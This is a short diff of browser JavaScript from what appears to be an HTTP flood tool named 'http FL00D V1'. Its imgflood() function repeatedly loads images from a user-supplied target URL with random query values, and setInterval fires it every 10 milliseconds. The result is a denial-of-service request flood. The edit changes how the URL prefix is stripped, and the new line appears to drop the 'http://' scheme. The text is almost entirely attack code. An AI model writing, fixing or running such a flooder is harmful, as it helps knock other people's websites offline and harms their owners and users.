@@ -6,11 +6,11 @@ if (confirm(text) == true) {
 text = alert("http FL00D V1 ATTACKING : " + x);
 text = document.write("SENDING REQUESTS TO : " + x);
 function imgflood() { 
-var TARGET = x.replace('https://','');
+var TARGET = x
 var URI = a
 var pic = new Image()
 var rand = Math.floor(Math.random() * 5000)
-pic.src = 'http://'+TARGET+URI+rand+'=val'
+pic.src = TARGET.replace('https://','')+URI+rand+'=val'
 }
 setInterval(imgflood, 10)
 } else {
